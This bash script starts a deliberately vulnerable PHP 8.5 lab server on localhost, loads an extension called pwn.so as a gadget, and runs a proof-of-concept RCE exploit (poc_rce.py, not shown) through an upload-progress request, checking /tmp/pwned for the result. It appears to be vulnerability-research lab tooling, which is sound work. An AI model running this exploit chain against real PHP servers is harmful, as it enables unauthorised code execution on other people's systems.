#!/usr/bin/env bash
# Start the vulnerable PHP 8.5 lab (built-in server) and run the PoC.
#
#   ./lab/run_lab.sh [port]
#
# Targets:
#   http://127.0.0.1:<port>/            -> normal request
#   http://127.0.0.1:<port>/consumer.php-> upload-progress RCE trigger
set -euo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
PORT="${1:-9031}"
PHP_BIN="${PHP_BIN:-/tmp/php-vuln85/bin/php}"
GADGET="${GADGET:-/tmp/opencode/scratchpad/ext-pwn/modules/pwn.so}"
WEBROOT="${WEBROOT:-/tmp/poc-lab/www}"
SESSDIR="${SESSDIR:-/tmp/poc-lab/sessions}"
SID="${SID:-abcdef0123456789abcdef0123456789}"

mkdir -p "$WEBROOT" "$SESSDIR"
cp "$HERE"/{index.php,consumer.php,producer.php} "$WEBROOT"/
sed -e "s#/tmp/asanlab/sessions#$SESSDIR#" "$HERE/lab.ini" > "$WEBROOT/../lab.ini"

echo "starting vulnerable PHP 8.5 on 127.0.0.1:$PORT (gadget: $GADGET)"
"$PHP_BIN" -d extension="$GADGET" \
           -S "127.0.0.1:$PORT" -t "$WEBROOT" -c "$WEBROOT/../lab.ini" \
           > /tmp/poc-lab/server.log 2>&1 &
echo $! > /tmp/poc-lab/server.pid
sleep 2

echo
echo "--- normal request ---"
curl -s "http://127.0.0.1:$PORT/index.php"

echo
echo "--- RCE trigger (upload progress request) ---"
rm -f /tmp/pwned
python3 "$(dirname "$HERE")/poc_rce.py" \
        --url "http://127.0.0.1:$PORT/" --sid "$SID" \
        --session-path "$SESSDIR/sess_$SID" --stage both || true

echo
echo "--- command output (/tmp/pwned) ---"
cat /tmp/pwned 2>/dev/null || echo "(no output - not exploited)"
echo
echo "server log: /tmp/poc-lab/server.log"
